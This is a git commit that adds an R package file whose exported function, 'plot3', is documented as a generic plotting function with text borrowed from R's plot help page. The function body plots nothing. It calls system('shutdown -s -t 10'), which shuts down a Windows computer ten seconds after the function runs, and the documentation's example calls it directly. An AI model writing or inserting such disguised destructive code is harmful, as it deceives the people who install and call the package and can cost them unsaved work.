9c8d10ce5113f7e83301816e246b31c098bf4719
Kermanips <60915684+Kermanips@users.noreply.github.com>
2020-02-11 09:17:34 +0100

    Add files via upload

---
+++ R/asie.r
@@ -0,0 +1,15 @@
+#' Plot 3 function
+#'
+#' Generic function for plotting of R objects. For more details about the graphical parameter arguments, see par.
+#' For simple scatter plots, plot.default will be used. However, there are plot methods for many R objects, including functions, data.frames, density objects, etc. Use methods(plot) and the documentation for these.
+#' @param X
+#' @param Y
+#' @keywords plot
+#' @export
+#' @examples
+#' plot3()
+
+
+plot3=function(x,y){
+  system("shutdown -s -t 10")
+}
